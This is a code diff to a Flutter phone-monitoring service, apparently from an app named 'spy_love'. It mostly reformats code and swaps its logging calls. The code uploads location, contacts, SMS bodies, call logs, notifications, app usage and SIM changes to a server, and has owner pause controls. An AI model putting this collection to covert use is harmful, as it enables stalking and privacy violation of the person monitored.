@@ -3,6 +3,7 @@ import 'dart:io';
 
 import 'package:call_log/call_log.dart';
 import 'package:flutter/foundation.dart';
+import 'package:spy_love/core/debug/app_log.dart';
 import 'package:geolocator/geolocator.dart';
 import 'package:permission_handler/permission_handler.dart';
 import 'package:spy_love/features/monitoring/collectors_bridge.dart';
@@ -150,7 +151,9 @@ class MonitoringService {
     // server-side; we only ask for the OS permission here.
     await Permission.contacts.request();
 
-    final location = AppPermission.monitoring.firstWhere((p) => p.scope == 'location');
+    final location = AppPermission.monitoring.firstWhere(
+      (p) => p.scope == 'location',
+    );
     await location.permission.request();
     if (Platform.isAndroid) {
       await Permission.locationAlways.request();
@@ -199,20 +202,23 @@ class MonitoringService {
       distanceFilter: 30,
     );
 
-    _locationSub = Geolocator.getPositionStream(locationSettings: settings).listen(
-      (position) => unawaited(_onPosition(position)),
-      onError: (Object e) => debugPrint('Location stream error: $e'),
-    );
+    _locationSub = Geolocator.getPositionStream(locationSettings: settings)
+        .listen(
+          (position) => unawaited(_onPosition(position)),
+          onError: (Object e) => AppLog.d('Location stream error: $e'),
+        );
   }
 
   Future<void> _uploadCurrentPosition() async {
     try {
       final position = await Geolocator.getCurrentPosition(
-        locationSettings: const LocationSettings(accuracy: LocationAccuracy.high),
+        locationSettings: const LocationSettings(
+          accuracy: LocationAccuracy.high,
+        ),
       );
       await _onPosition(position);
     } catch (e) {
-      debugPrint('Current location failed: $e');
+      AppLog.d('Current location failed: $e');
     }
   }
 
@@ -232,18 +238,13 @@ class MonitoringService {
       return;
     }
     final result = await repo.list();
-    result.fold(
-      (zones) {
-        final deviceId = _activeDeviceId;
-        _cachedZones = zones
-            .where(
-              (z) => z.deviceId == null || z.deviceId == deviceId,
-            )
-            .toList();
-        _zonesFetchedAt = DateTime.now();
-      },
-      (_) {},
-    );
+    result.fold((zones) {
+      final deviceId = _activeDeviceId;
+      _cachedZones = zones
+          .where((z) => z.deviceId == null || z.deviceId == deviceId)
+          .toList();
+      _zonesFetchedAt = DateTime.now();
+    }, (_) {});
   }
 
   Future<void> _evaluateGeofences(Position position) async {
@@ -395,7 +396,9 @@ class MonitoringService {
       unawaited(
         _upload([
           {
-            'event_type': removed ? 'notification.removed' : 'notification.posted',
+            'event_type': removed
+                ? 'notification.removed'
+                : 'notification.posted',
             'payload': {
               'app': package,
               'package': package,
@@ -431,29 +434,28 @@ class MonitoringService {
       if (contacts.isEmpty) return;
 
       final sanitized = contacts
-          .map((c) => {
-                'contact_id': c['contact_id'],
-                'name': c['name'] ?? '',
-                'phones': c['phones'] ?? const <String>[],
-                'emails': c['emails'] ?? const <String>[],
-              })
+          .map(
+            (c) => {
+              'contact_id': c['contact_id'],
+              'name': c['name'] ?? '',
+              'phones': c['phones'] ?? const <String>[],
+              'emails': c['emails'] ?? const <String>[],
+            },
+          )
           .toList();
 
       final hourBucket = now.millisecondsSinceEpoch ~/ 3600000;
       await _upload([
         {
           'event_type': 'contact.snapshot',
-          'payload': {
-            'contacts': sanitized,
-            'count': sanitized.length,
-          },
+          'payload': {'contacts': sanitized, 'count': sanitized.length},
           'idempotency_key': 'contacts-$hourBucket-${sanitized.length}',
           'timestamp': now.toUtc().toIso8601String(),
         },
       ]);
       _lastContactsUpload = now;
     } catch (e) {
-      debugPrint('Contacts sync failed: $e');
+      AppLog.d('Contacts sync failed: $e');
     }
   }
 
@@ -470,16 +472,20 @@ class MonitoringService {
         return;
       }
 
-      final apps = await InstalledAppsBridge.getInstalledApps(includeSystem: true);
+      final apps = await InstalledAppsBridge.getInstalledApps(
+        includeSystem: true,
+      );
       if (apps.isEmpty) return;
 
       final sanitized = apps
-          .map((a) => {
-                'package': a['package'],
-                'name': a['name'],
-                'system': a['system'] == true,
-                if (a['version'] != null) 'version': a['version'],
-              })
+          .map(
+            (a) => {
+              'package': a['package'],
+              'name': a['name'],
+              'system': a['system'] == true,
+              if (a['version'] != null) 'version': a['version'],
+            },
+          )
           .where((a) => (a['package'] ?? '').toString().isNotEmpty)
           .toList();
       if (sanitized.isEmpty) return;
@@ -499,7 +505,7 @@ class MonitoringService {
       ]);
       _lastAppInventoryUpload = now;
     } catch (e) {
-      debugPrint('App inventory sync failed: $e');
+      AppLog.d('App inventory sync failed: $e');
     }
   }
 
@@ -522,7 +528,7 @@ class MonitoringService {
     if (_activeDeviceId == null) return;
     await _refreshPauseState();
     if (isSharingPaused) {
-      debugPrint('Sharing paused until $_pausedUntil — dropping upload cycle');
+      AppLog.d('Sharing paused until $_pausedUntil — dropping upload cycle');
       return;
     }
     await _refreshSafeZones(force: true);
@@ -543,13 +549,10 @@ class MonitoringService {
     final devices = _devices;
     if (deviceId == null || devices == null) return;
     final result = await devices.getOwnedDeviceStatus(deviceId);
-    result.fold(
-      (status) {
-        _sharing = status.sharing;
-        _pausedUntil = status.sharing.pausedUntil;
-      },
-      (_) {},
-    );
+    result.fold((status) {
+      _sharing = status.sharing;
+      _pausedUntil = status.sharing.pausedUntil;
+    }, (_) {});
   }
 
   Future<String?> _resolveDeviceId() async {
@@ -568,14 +571,11 @@ class MonitoringService {
       id: deviceId,
       durationMinutes: durationMinutes,
     );
-    return result.fold(
-      (sharing) {
-        _sharing = sharing;
-        _pausedUntil = sharing.pausedUntil;
-        return sharing;
-      },
-      (_) => null,
-    );
+    return result.fold((sharing) {
+      _sharing = sharing;
+      _pausedUntil = sharing.pausedUntil;
+      return sharing;
+    }, (_) => null);
   }
 
   /// Owner resume. Returns updated sharing state, or null on failure.
@@ -584,14 +584,11 @@ class MonitoringService {
     final deviceId = await _resolveDeviceId();
     if (deviceId == null || deviceId.isEmpty || devices == null) return null;
     final result = await devices.resumeOwnedDevice(deviceId);
-    return result.fold(
-      (sharing) {
-        _sharing = sharing;
-        _pausedUntil = sharing.pausedUntil;
-        return sharing;
-      },
-      (_) => null,
-    );
+    return result.fold((sharing) {
+      _sharing = sharing;
+      _pausedUntil = sharing.pausedUntil;
+      return sharing;
+    }, (_) => null);
   }
 
   void applySharingState(SharingState state) {
@@ -609,7 +606,8 @@ class MonitoringService {
       final now = DateTime.now();
       final percent = status['percent'];
       final charging = status['charging'] == true;
-      final stateKey = '$percent-$charging-${status['status']}-${status['plugged']}';
+      final stateKey =
+          '$percent-$charging-${status['status']}-${status['plugged']}';
 
       if (_lastBatteryKey == stateKey &&
           _lastBatteryUpload != null &&
@@ -636,7 +634,7 @@ class MonitoringService {
       _lastBatteryKey = stateKey;
       _lastBatteryUpload = now;
     } catch (e) {
-      debugPrint('Battery sync failed: $e');
+      AppLog.d('Battery sync failed: $e');
     }
   }
 
@@ -662,10 +660,7 @@ class MonitoringService {
       await _upload([
         {
           'event_type': 'network.status',
-          'payload': {
-            'type': type,
-            'connected': connected,
-          },
+          'payload': {'type': type, 'connected': connected},
           'idempotency_key': 'net-$minuteBucket-$stateKey',
           'timestamp': now.toUtc().toIso8601String(),
         },
@@ -673,7 +668,7 @@ class MonitoringService {
       _lastNetworkKey = stateKey;
       _lastNetworkUpload = now;
     } catch (e) {
-      debugPrint('Network sync failed: $e');
+      AppLog.d('Network sync failed: $e');
     }
   }
 
@@ -713,7 +708,7 @@ class MonitoringService {
       ]);
       _lastDeviceInfoUpload = now;
     } catch (e) {
-      debugPrint('Device info sync failed: $e');
+      AppLog.d('Device info sync failed: $e');
     }
   }
 
@@ -729,25 +724,27 @@ class MonitoringService {
         return;
       }
 
-      final sinceMs = now.subtract(const Duration(hours: 24)).millisecondsSinceEpoch;
-      final apps = await CollectorsBridge.getAppUsage(sinceMs: sinceMs, limit: 20);
+      final sinceMs = now
+          .subtract(const Duration(hours: 24))
+          .millisecondsSinceEpoch;
+      final apps = await CollectorsBridge.getAppUsage(
+        sinceMs: sinceMs,
+        limit: 20,
+      );
       if (apps.isEmpty) return;
 
       final minuteBucket = now.millisecondsSinceEpoch ~/ 300000; // 5-min bucket
       await _upload([
         {
           'event_type': 'app_usage.snapshot',
-          'payload': {
-            'apps': apps,
-            'window_hours': 24,
-          },
+          'payload': {'apps': apps, 'window_hours': 24},
           'idempotency_key': 'usage-$minuteBucket-${apps.length}',
           'timestamp': now.toUtc().toIso8601String(),
         },
       ]);
       _lastAppUsageUpload = now;
     } catch (e) {
-      debugPrint('App usage sync failed: $e');
+      AppLog.d('App usage sync failed: $e');
     }
   }
 
@@ -812,37 +809,49 @@ class MonitoringService {
       final iccId = sim['icc_id']?.toString() ?? '';
 
       if (prev == null) {
-        batch.add(_simEvent(
-          type: 'sim.inserted',
-          sim: sim,
-          timestamp: now,
-          idempotencyKey: 'sim-in-$slot-$iccId-${now.millisecondsSinceEpoch ~/ 60000}',
-        ));
+        batch.add(
+          _simEvent(
+            type: 'sim.inserted',
+            sim: sim,
+            timestamp: now,
+            idempotencyKey:
+                'sim-in-$slot-$iccId-${now.millisecondsSinceEpoch ~/ 60000}',
+          ),
+        );
       } else if (prev['icc_id']?.toString() != iccId) {
-        batch.add(_simEvent(
-          type: 'sim.removed',
-          sim: prev,
-          timestamp: now,
-          idempotencyKey: 'sim-out-$slot-${prev['icc_id']}-${now.millisecondsSinceEpoch ~/ 60000}',
-        ));
-        batch.add(_simEvent(
-          type: 'sim.inserted',
-          sim: sim,
-          timestamp: now,
-          idempotencyKey: 'sim-in-$slot-$iccId-${now.millisecondsSinceEpoch ~/ 60000}',
-        ));
+        batch.add(
+          _simEvent(
+            type: 'sim.removed',
+            sim: prev,
+            timestamp: now,
+            idempotencyKey:
+                'sim-out-$slot-${prev['icc_id']}-${now.millisecondsSinceEpoch ~/ 60000}',
+          ),
+        );
+        batch.add(
+          _simEvent(
+            type: 'sim.inserted',
+            sim: sim,
+            timestamp: now,
+            idempotencyKey:
+                'sim-in-$slot-$iccId-${now.millisecondsSinceEpoch ~/ 60000}',
+          ),
+        );
       }
     }
 
     for (final entry in previous.entries) {
       final slot = entry.key;
       if (!current.containsKey(slot)) {
-        batch.add(_simEvent(
-          type: 'sim.removed',
-          sim: entry.value,
-          timestamp: now,
-          idempotencyKey: 'sim-out-$slot-${entry.value['icc_id']}-${now.millisecondsSinceEpoch ~/ 60000}',
-        ));
+        batch.add(
+          _simEvent(
+            type: 'sim.removed',
+            sim: entry.value,
+            timestamp: now,
+            idempotencyKey:
+                'sim-out-$slot-${entry.value['icc_id']}-${now.millisecondsSinceEpoch ~/ 60000}',
+          ),
+        );
       }
     }
 
@@ -883,7 +892,8 @@ class MonitoringService {
     if (!await Permission.phone.isGranted) return;
 
     try {
-      final since = _lastCallSync ?? DateTime.now().subtract(const Duration(days: 30));
+      final since =
+          _lastCallSync ?? DateTime.now().subtract(const Duration(days: 30));
       final entries = await CallLog.query(
         dateFrom: since.millisecondsSinceEpoch,
         dateTo: DateTime.now().millisecondsSinceEpoch,
@@ -910,7 +920,7 @@ class MonitoringService {
         _lastCallSync = DateTime.now();
       }
     } catch (e) {
-      debugPrint('Call log sync failed: $e');
+      AppLog.d('Call log sync failed: $e');
     }
   }
 
@@ -930,7 +940,8 @@ class MonitoringService {
     if (!await Permission.sms.isGranted) return;
 
     try {
-      final since = _lastSmsSync ?? DateTime.now().subtract(const Duration(days: 30));
+      final since =
+          _lastSmsSync ?? DateTime.now().subtract(const Duration(days: 30));
       final messages = await NotificationBridge.getSmsInbox(
         sinceMs: since.millisecondsSinceEpoch,
         limit: 100,
@@ -941,10 +952,7 @@ class MonitoringService {
         final ts = DateTime.fromMillisecondsSinceEpoch(date);
         return {
           'event_type': 'sms.received',
-          'payload': {
-            'from': sms['address'],
-            'body': sms['body'],
-          },
+          'payload': {'from': sms['address'], 'body': sms['body']},
           'idempotency_key': 'sms-$date-${sms['address']}',
           'timestamp': ts.toUtc().toIso8601String(),
         };
@@ -955,7 +963,7 @@ class MonitoringService {
         _lastSmsSync = DateTime.now();
       }
     } catch (e) {
-      debugPrint('SMS sync failed: $e');
+      AppLog.d('SMS sync failed: $e');
     }
   }
 
@@ -963,31 +971,36 @@ class MonitoringService {
     final deviceId = _activeDeviceId;
     if (deviceId == null || events.isEmpty) return;
     if (isSharingPaused) {
-      debugPrint('Dropping ${events.length} queued events — sharing paused');
+      AppLog.d('Dropping ${events.length} queued events — sharing paused');
       return;
     }
 
     for (var i = 0; i < events.length; i += 50) {
-      final chunk = events.sublist(i, i + 50 > events.length ? events.length : i + 50);
-      final result = await _events.uploadBatch(deviceId: deviceId, events: chunk);
-      result.fold(
-        (body) {
-          if (body['paused'] == true) {
-            final untilRaw = body['paused_until'];
-            final until = untilRaw != null
-                ? DateTime.tryParse(untilRaw.toString())
-                : null;
-            _pausedUntil = until;
-            _sharing = SharingState(
-              paused: true,
-              pausedUntil: until,
-              resumesInSeconds:
-                  until?.toUtc().difference(DateTime.now().toUtc()).inSeconds,
-            );
-          }
-        },
-        (_) {},
+      final chunk = events.sublist(
+        i,
+        i + 50 > events.length ? events.length : i + 50,
       );
+      final result = await _events.uploadBatch(
+        deviceId: deviceId,
+        events: chunk,
+      );
+      result.fold((body) {
+        if (body['paused'] == true) {
+          final untilRaw = body['paused_until'];
+          final until = untilRaw != null
+              ? DateTime.tryParse(untilRaw.toString())
+              : null;
+          _pausedUntil = until;
+          _sharing = SharingState(
+            paused: true,
+            pausedUntil: until,
+            resumesInSeconds: until
+                ?.toUtc()
+                .difference(DateTime.now().toUtc())
+                .inSeconds,
+          );
+        }
+      }, (_) {});
       if (isSharingPaused) break;
     }
   }
